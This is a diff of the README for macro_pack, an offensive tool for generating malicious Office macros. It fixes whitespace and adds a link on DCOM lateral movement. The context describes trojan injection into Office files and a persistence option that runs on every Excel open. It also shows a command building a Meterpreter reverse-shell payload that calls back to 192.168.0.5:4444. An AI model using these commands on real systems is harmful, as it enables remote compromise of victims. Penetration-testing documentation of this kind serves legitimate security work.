@@ -228,7 +228,7 @@ echo 192.168.0.5 4444 | macro_pack.exe -t METERPRETER -o -G "\\192.168.0.8\c$\us
     --keep-alive    Use with --vbom-encode option. Ensure new app instance will stay alive even when macro has finished
     --persist       Use with --vbom-encode option. Macro will automatically be persisted in application startup path
                     (works with Excel documents only). The macro will then be executed anytime an Excel document is opened (even non-macro documents).
-	-T, --trojan=OUTPUT_FILE_PATH   Inject macro in an existing MS office file. 
+    -T, --trojan=OUTPUT_FILE_PATH   Inject macro in an existing MS office file. 
                     Supported files are the same as for the -G option.
                     Files will also be converted to approriate format, ex: pres.pptx will become pres.pptm
                     If file does not exist, it will be created (like -G option)
@@ -332,6 +332,7 @@ Blog post about MS Office security:
  - http://blog.sevagas.com/?My-VBA-Bot (write a full VBA RAT, includes how to bypass VBOM protection)
  - http://pwndizzle.blogspot.fr/2017/03/office-document-macros-ole-actions-dde.html
  - https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/ (About Dynamic Data Exchange attacks)
+ - https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/
  
  Other useful links:
  - https://github.com/p3nt4/PowerShdll (Run PowerShell with dlls only)
